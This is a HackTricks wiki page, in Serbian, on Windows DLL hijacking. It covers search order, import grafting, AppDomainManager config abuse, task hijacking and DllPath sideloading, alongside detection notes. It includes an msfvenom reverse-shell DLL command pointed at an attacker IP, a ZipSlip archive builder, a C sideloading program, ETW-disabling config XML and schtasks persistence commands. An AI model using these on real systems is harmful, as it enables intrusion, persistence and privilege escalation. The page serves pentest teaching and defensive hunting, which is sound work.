# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva navođenje pouzdane aplikacije da učita zlonamerni DLL. Ovaj pojam obuhvata nekoliko taktika, kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda i postizanje perzistencije, a ređe za eskalaciju privilegija. Iako je ovde fokus na eskalaciji, način otmice je isti bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking se koristi više metoda, a njihova efikasnost zavisi od načina na koji aplikacija učitava DLL-ove:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, uz opcionalno korišćenje DLL Proxying-a radi očuvanja funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pretrage ispred legitimnog i iskorišćavanje redosleda pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji će aplikacija učitati misleći da je u pitanju nepostojeći, ali neophodan DLL.
4. **DLL Redirection**: Izmena parametara pretrage kao što su `%PATH%` ili datoteke `.exe.manifest` / `.exe.local` kako bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernom verzijom u direktorijumu WinSxS; ova metoda se često povezuje sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika, zajedno sa kopiranom aplikacijom, što podseća na tehnike Binary Proxy Execution.

Aplikacija može da implementira i **sopstveni DLL loader**. Proces sa povišenim privilegijama može da izlista podređeni direktorijum, kao što je `Libraries` ili `Plugins`, i prosledi odabrani DLL pomoćnom programu, nezavisno od uobičajenog redosleda pretrage DLL-ova u Windows-u. Ako drugi nalog može da kreira datoteke u tom konkretnom direktorijumu, to treba posmatrati kao trag za dalju proveru: potvrdite identitet procesa, efektivne ACL-ove direktorijuma, pravilo za izbor datoteke i mogućnost da se učitavanje zaista pokrene. To što je direktorijum pored izvršne datoteke upisiv ne dokazuje da proces iz njega učitava DLL-ove.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Naknadno graftovanje PE import-a

Klasični side-loading ostavlja pouzdani PE neizmenjenim i iskorišćava razrešavanje naziva DLL-a. **Import grafting** umesto toga menja PE koji je pouzdani program već učitao. Napadač dodaje deskriptor import-a i povezane lookup/IAT unose za DLL pod kontrolom napadača. Kada Windows rekurzivno razreši tu zavisnost, učitava dodati DLL i pokreće njegov inicijalizacioni kod unutar inače legitimnog procesa. Ovo je izmena PE datoteke na disku, a ne isto što i zamena pokazivača na IAT funkciju tokom izvršavanja runtime hook-om.<sup>[[26]](#references)[[27]](#references)</sup>

Izmenjeni PE može biti posredni DLL dobavljača, a ne izvršna datoteka koju pokreće korisnik ili Task Scheduler. Ponovljiv lanac je sledeći:<sup>[[27]](#references)</sup>

1. Kopirajte legitimnu izvršnu datoteku i njene zavisnosti u direktorijum pod kontrolom napadača.
2. Izmenite import strukture jedne zavisnosti tako da upućuju na zlonamerni DLL, uz očuvanje očekivanih export-a i uobičajenog ponašanja zavisnosti.
3. Podesite autorun ili zakazani zadatak da pokrene legitimnu izvršnu datoteku. Loader učitava izmenjenu zavisnost, a zatim i novouvezeni DLL. Pogledajte [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) za enumeraciju zadataka.
4. Ne stavljajte zahtevne operacije u `DllMain`; posmatrani loader je kreirao worker thread i tamo nastavio faznu dekripciju.

Ovo se razlikuje od kompromitovanja lanca snabdevanja na strani dobavljača: paket dobavljača ostaje čist, a izmena import-a se dešava nakon instalacije. Ispitajte svaki modul u pripremljenom direktorijumu, ne samo host EXE: uporedite liste import-a i hash-eve zavisnosti sa poznatom ispravnom instalacijom, proverite potpise i istražite izvršne datoteke dobavljača pokrenute sa neočekivanih upisivih lokacija, kao što je `C:\ProgramData`. Zakazani zadatak koji upućuje na kopirani crash reporter ili updater u takvom direktorijumu posebno je koristan trag za dalje istraživanje.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + assembly pod kontrolom napadača)

Klasični DLL sideloading nije jedini način da se pouzdan proces **.NET Framework** navede da učita kod napadača. Ako je ciljna izvršna datoteka **managed** aplikacija, CLR proverava i **konfiguracionu datoteku aplikacije** nazvanu po izvršnoj datoteci (na primer `Setup.exe.config`). Ta datoteka može da definiše prilagođeni **AppDomainManager**. Ako konfiguracija upućuje na assembly pod kontrolom napadača, smešten pored EXE datoteke, CLR ga učitava **pre uobičajenog toka izvršavanja aplikacije** i pokreće unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft-ovoj konfiguracionoj šemi za .NET Framework, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti navedeni da bi se koristio prilagođeni manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracija:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalni menadžer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zasniva se na parsiranju CLR konfiguracije, a ne na redosledu pretrage Win32 DLL-ova.
- Host zaista mora biti **managed EXE**. Brza trijaža: `sigcheck -m target.exe`, `corflags target.exe` ili proverite **CLR Runtime Header** u PE metapodacima.
- Naziv konfiguracione datoteke mora tačno da odgovara nazivu izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE-a**.
- Ovo je korisno uz **potpisane Microsoft/vendor binarne datoteke**, jer pouzdani EXE ostaje netaknut, dok se zlonamerni managed assembly izvršava unutar istog procesa.
- Ako već imate direktorijum instalacije/ažuriranja u koji može da se upisuje, AppDomainManager hijacking može da se koristi kao **prva faza**, a zatim da slede klasični DLL sideloading ili reflective loading za kasnije faze.

### AppDomainManager kao downloader + pokretač scheduled task-a

Praktičan obrazac upada je uparivanje pouzdanog managed EXE-a sa zlonamernim `*.config` fajlom i zlonamernim AppDomainManager DLL-om koji služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće potpisani .NET installer ili updater sa uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridruženi config navodi CLR da učita napadačev assembly **pre nego što počne logika legitimne aplikacije**.
3. Zlonamerni manager primenjuje **proveru putanje** (na primer, nastavlja samo ako se host EXE pokreće iz `Downloads`, a drugoj fazi dozvoljava pokretanje samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, preuzima stvarni payload u putanju u koju korisnik može da upisuje, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta značajna:
- Potpisani host EXE ostaje neizmenjen, pa trijaža koja proverava samo hash glavne binarne datoteke može da previdi kompromitovanje.
- Jednostavan **anti-analysis zasnovan na putanji** je čest: premeštanje ZIP/EXE/DLL trojke na Desktop, u Temp ili na putanju sandbox-a može namerno da prekine lanac.
- AppDomainManager DLL prve faze može da ostane mali i neupadljiv, dok se stvarni implant preuzima kasnije.

Minimalni primer persistence-a koji se često viđa u ovom obrascu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Napomene:
- `/rl highest` znači **najviši dostupan nivo** za tog korisnika/sesiju; sam po sebi ne garantuje eskalaciju do SYSTEM-a.
- Ovu tehniku je često bolje klasifikovati kao **izvršavanje/persistenciju zloupotrebom .NET konfiguracije** nego kao klasični hijacking redosleda pretrage zbog nedostajućeg DLL-a, iako operateri često kombinuju obe tehnike.

Tačke za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz **putanja za raspakivanje ZIP arhiva**, fascikli `Downloads`, `%TEMP%` ili drugih fascikli u koje korisnik može da upisuje, uz **pridruženi** `<exe>.config`.
- Novi zakazani zadaci čija se radnja nalazi u `%LOCALAPPDATA%`, `%APPDATA%` ili fascikli `Downloads`, a čiji nazivi oponašaju programe za ažuriranje pregledača/proizvođača.
- Kratkotrajni upravljani procesi za pokretanje koji odmah preuzmu drugi EXE, a zatim pokrenu `schtasks.exe`.
- Uzorci koji se rano završavaju osim ako se putanja izvršnog fajla podudara sa očekivanom fasciklom korisničkog profila.

### Hijacking postojećeg zakazanog zadatka radi ponovnog pokretanja lanca sideload-a

Za uspostavljanje persistencije nemojte tražiti samo **kreiranje novog zadatka**. Neke grupe napadača čekaju da legitimni instalacioni program kreira **uobičajeni zadatak za ažuriranje**, a zatim **prepravljaju radnju zadatka** tako da postojeći naziv, autor i okidač ostanu poznati braniocima.

Ponovljiv postupak:
1. Instalirajte/pokrenite legitimni softver i utvrdite koji zadatak obično kreira.
2. Izvezite XML zadatka i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo radnju tako da zadatak pokrene vaš **pouzdani host EXE** iz privremene fascikle u koju korisnik može da upisuje, a koji zatim sideload-uje ili učitava stvarni payload preko AppDomain-a.
4. Ponovo registrujte isti naziv zadatka umesto da kreirate novi, upadljiv artefakt persistencije.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Zašto je neupadljivije:
- Naziv zadatka i dalje može delovati legitimno (na primer, kao program za ažuriranje dobavljača).
- Pokreće ga **Task Scheduler service**, pa provera roditeljskog procesa ili predaka često vidi očekivani lanac raspoređivanja umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive zadataka** mogu prevideti zadatak čija je registracija već postojala, ali čija radnja sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili drugu putanju pod kontrolom napadača.

Brze tačke za proveru:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke iz `C:\Windows\System32\Tasks\*` i metapodatke iz `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa osnovnim stanjem.
- Generišite upozorenje kada se **zadatak za ažuriranje koji izgleda kao da pripada dobavljaču** izvršava iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa datotekom `*.config` u istom direktorijumu.

> [!TIP]
> Za detaljan lanac koraka koji nadovezuje HTML pripremu, AES-CTR konfiguracije i .NET implantate na DLL sideloading, pogledajte tok rada u nastavku.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih DLL-ova

Najčešći način da pronađete nedostajuće DLL-ove u sistemu jeste da pokrenete [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz paketa Sysinternals i **postavite** **sledeća 2 filtera**:

![Uobičajene tehnike - Pronalaženje nedostajućih DLL-ova: Najčešći način da pronađete nedostajuće DLL-ove u sistemu jeste da pokrenete procmon iz paketa Sysinternals i postavite sledeća 2 filtera](<../../../images/image (961).png>)

![Uobičajene tehnike - Pronalaženje nedostajućih DLL-ova: Najčešći način da pronađete nedostajuće DLL-ove u sistemu jeste da pokrenete procmon iz paketa Sysinternals i postavite sledeća 2 filtera](<../../../images/image (230).png>)

i prikažete samo **aktivnost sistema datoteka**:

![Uobičajene tehnike - Pronalaženje nedostajućih DLL-ova: i prikažete samo aktivnost sistema datoteka](<../../../images/image (153).png>)

Ako tražite **nedostajuće DLL-ove uopšte**, ostavite ovo pokrenuto nekoliko **sekundi**.\
Ako tražite **nedostajući DLL u određenoj izvršnoj datoteci**, postavite još jedan filter, na primer **"Process Name" "contains" `<exec name>`**, pokrenite je i zaustavite hvatanje događaja.<sup>[[9]](#references)</sup>

## Iskorišćavanje nedostajućih DLL-ova

Da biste eskalirali privilegije, potražite **DLL koji privilegovani proces pokušava da učita** sa lokacije u koju možete da upisujete. Do toga može doći kada kontrolišete direktorijum koji se pretražuje pre direktorijuma sa legitimnim DLL-om ili kada traženi DLL ne postoji, a možete da upisujete u neki od direktorijuma koji se pretražuju.

### Redosled pretrage DLL-ova

**U okviru** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove prateći skup **unapred definisanih putanja za pretragu** određenim redosledom. DLL hijacking nastaje kada se zlonamerni DLL strateški smesti u jedan od tih direktorijuma, čime se obezbeđuje da bude učitan pre autentičnog DLL-a. Jedan od načina da se to spreči jeste da aplikacija koristi apsolutne putanje kada navodi DLL-ove koji su joj potrebni.

U nastavku možete videti **redosled pretrage DLL-ova na 32-bitnim** sistemima:

1. Direktorijum iz kog je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju do ovog direktorijuma.(_C:\Windows\System32_)
3. Sistemski direktorijum za 16-bitne aplikacije. Ne postoji funkcija za dobijanje putanje do ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju do ovog direktorijuma.
   1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u promenljivoj okruženja PATH. Imajte u vidu da to ne uključuje putanju za pojedinačnu aplikaciju navedenu u registry ključu **App Paths**. Ključ **App Paths** se ne koristi pri izračunavanju putanje za pretragu DLL-ova.

Ovo je podrazumevani redosled pretrage kada je **SafeDllSearchMode** omogućen. Kada je onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registry vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

DLL se konačno može učitati i pomoću apsolutne putanje, a ne imena. U tom slučaju Windows traži sam DLL samo na toj putanji; zavisnosti navedene imenom i dalje prate odgovarajući redosled pretrage.

Postoje i drugi načini za menjanje redosleda pretrage, ali ih ovde neću objašnjavati.

### Nadovezivanje proizvoljnog upisa u datoteku na preuzimanje nedostajućeg DLL-a

**Povezana tehnika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Koristite **ProcMon** filtere (`Process Name` = ciljni EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) da biste prikupili nazive DLL-ova koje proces traži, ali ne pronalazi.<sup>[[14]](#references)</sup>
2. Ako se binarna datoteka pokreće po **rasporedu/kao servis**, postavljanje DLL-a sa jednim od tih naziva u **direktorijum aplikacije** (prvo mesto u redosledu pretrage) dovešće do njegovog učitavanja pri sledećem pokretanju. U jednom slučaju sa .NET skenerom, proces je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravu kopiju iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite DLL sa payload-om (npr. reverse shell) i bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitiv **proizvoljan upis u stilu ZipSlip-a**, napravite ZIP čija stavka izlazi iz direktorijuma za raspakivanje, tako da DLL završi u direktorijumu aplikacije:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Isporučite arhivu u nadgledani inbox/share; kada zakazani zadatak ponovo pokrene proces, on učitava zlonamerni DLL i izvršava vaš kod kao servisni nalog.

### Forsiranje sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da se deterministički utiče na DLL search path novokreiranog procesa jeste da se postavi polje DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll native API-ja. Ako ovde navedete direktorijum koji kontroliše napadač, ciljni proces koji razrešava naziv uvezenog DLL-a (bez apsolutne putanje i bez korišćenja bezbednih loading flagova) može biti primoran da učita zlonamerni DLL iz tog direktorijuma.

Osnovna ideja
- Kreirajte parametre procesa pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na fasciklu koju kontrolišete (npr. direktorijum u kome se nalaze vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binarni fajl razrešava naziv DLL-a, loader će tokom razrešavanja konsultovati navedeni DllPath, što omogućava pouzdan sideloading čak i kada se zlonamerni DLL ne nalazi u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na proces dete koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Ciljni proces mora da uvozi DLL ili da pozove LoadLibrary za DLL po nazivu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu biti hijack-ovani. Forwarded exports i SxS mogu promeniti redosled prioriteta.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Kompletan C primer: forsiranje DLL sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji izvozi potrebne funkcije ili prosleđuje pozive pravoj biblioteci) u direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji je poznato da pomoću gore navedene tehnike traži xmllite.dll po imenu. Loader razrešava import preko zadate putanje DllPath i vrši sideloading vaše DLL biblioteke.

Primećeno je da se ova tehnika koristi u stvarnim napadima za pokretanje višestepenih sideloading lanaca: početni pokretač ispušta pomoćnu DLL biblioteku, koja zatim pokreće Microsoftovim potpisom potpisan binarni fajl podložan hijacking-u, sa prilagođenom putanjom DllPath, kako bi primorao učitavanje napadačeve DLL biblioteke iz privremenog direktorijuma.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking preko `.exe.config`

Za ciljeve **.NET Framework**, sideloading može da se obavi **pre `Main()`** bez izmene memorije, zloupotrebom pridružene datoteke **`.exe.config`** aplikacije. Umesto oslanjanja isključivo na redosled pretrage Win32 DLL biblioteka, napadač postavlja legitimnu .NET EXE datoteku pored zlonamernog konfiguracionog fajla i jednog ili više sklopova pod kontrolom napadača.

Kako funkcioniše lanac:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Konfiguracija postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, tako da runtime instancira napadačev `AppDomainManager`.
3. Zlonamerni manager dobija mogućnost **izvršavanja pre `Main()`** unutar pouzdanog host procesa.
4. Ista konfiguracija može da natera CLR da prvo razreši lokalne sklopove (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i da oslabi validaciju/runtime telemetriju bez inline patching-a.

Obrazac nalik kampanji (tačno ugnježđivanje može da varira u zavisnosti od direktive/CLR verzije):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava razrešavanje assembly-ja u direktorijumu aplikacije, pretvarajući fasciklu u predvidljivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** preusmeravaju izvršavanje u napadačev kod tokom inicijalizacije CLR-a, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti aplikaciji sa punim nivoom poverenja da učita nepotpisane ili izmenjene assembly-je bez greške pri validaciji strong-name potpisa.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** izbegava preusmeravanja publisher policy-ja na novije assembly-je.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a predvidljivijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** posebno je zanimljiv zato što **CLR onemogućava sopstvenu ETW vidljivost** iz konfiguracije, umesto da implant u memoriji zakrpi `EtwEventWrite`.

Operativni obrazac uočen u novijim kampanjama:
- Faza 1 ispušta `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Faza 2 kopira ih u uverljivu fasciklu za **AppData ažuriranje**, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće preko **scheduled task-a**.
- Faza 3 proverava kontekst izvršavanja (na primer, očekivani roditeljski proces `svchost.exe` iz Task Scheduler-a) pre učitavanja konačnog RAT DLL-a/eksporta.

Ideje za lov na pretnje:
- Potpisani ili na drugi način legitimni **.NET izvršni fajlovi** koji se pokreću uz sumnjive susedne **`.config`** fajlove na lokacijama u koje korisnik može da upisuje.
- `.config` fajlovi koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled task-ovi koji ponovo pokreću preimenovane update binarne fajlove iz direktorijuma **`%LOCALAPPDATA%`** ili direktorijuma specifičnih za aplikaciju, kao što je `\bin\update\`.
- Lanci roditeljskih/podređenih procesa u kojima scheduled task pokreće pouzdani .NET host koji odmah učitava assembly-je koji nisu od proizvođača iz sopstvenog direktorijuma.

#### Izuzeci u redosledu pretrage DLL-a prema Windows dokumentaciji

Windows dokumentacija navodi određene izuzetke od standardnog redosleda pretrage DLL-a:

- Kada se naiđe na **DLL koji ima isto ime kao DLL koji je već učitan u memoriju**, sistem zaobilazi uobičajenu pretragu. Umesto toga, proverava redirekciju i manifest, pa se zatim vraća na DLL koji je već u memoriji. **U ovom slučaju sistem ne pretražuje DLL**.
- Ako je DLL prepoznat kao **poznati DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju tog poznatog DLL-a, kao i sve njegove zavisne DLL-ove, **bez sprovođenja pretrage**. Registarski ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL-ova.
- Ako DLL **ima zavisnosti**, pretraga tih zavisnih DLL-ova sprovodi se kao da su navedeni samo svojim **imenima modula**, bez obzira na to da li je početni DLL pronađen pomoću pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje) i kojem **nedostaje DLL**.
- Obezbedite **pristup za pisanje** u bilo koji **direktorijum** u kojem će se **DLL** **tražiti**. To može biti direktorijum izvršnog fajla ili direktorijum unutar sistemske putanje.

Ovi preduslovi su podrazumevano neuobičajeni: privilegovanim izvršnim fajlovima obično ne nedostaju DLL zavisnosti, a standardni korisnici uglavnom ne mogu da upisuju u direktorijume sistemske putanje za pretragu. Pogrešno konfigurisana okruženja i dalje mogu izložiti oba uslova.\
Ako su zahtevi ispunjeni, proverite projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj UAC bypass, sadrži PoC-ove za DLL hijacking za određene verzije Windows-a koji se često mogu prilagoditi direktorijumu u koji možete da upisujete.

Imajte na umu da **dozvole u fascikli** možete da proverite pomoću:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **proverite dozvole svih fascikli unutar PATH-a**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Možete proveriti i imports izvršne datoteke i exports DLL-a pomoću:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Za kompletan vodič o tome kako **zloupotrebiti DLL Hijacking za eskalaciju privilegija** uz dozvole za pisanje u fasciklu **System Path**, pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u nekoj fascikli unutar system PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešnu eksploataciju jeste da **napravite dll koji eksportuje barem sve funkcije koje će izvršna datoteka uvesti iz njega**. Ipak, imajte na umu da je DLL Hijacking koristan za [eskalaciju sa nivoa Medium Integrity na High **(zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako da napravite ispravan dll** možete pronaći u ovoj studiji o DLL Hijacking-u, koja se bavi DLL hijacking-om za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećem odeljku** možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za pravljenje **dll-a sa eksportovanim funkcijama koje nisu obavezne**.

## **Kreiranje i kompajliranje DLL-ova**

### **DLL Proxifying**

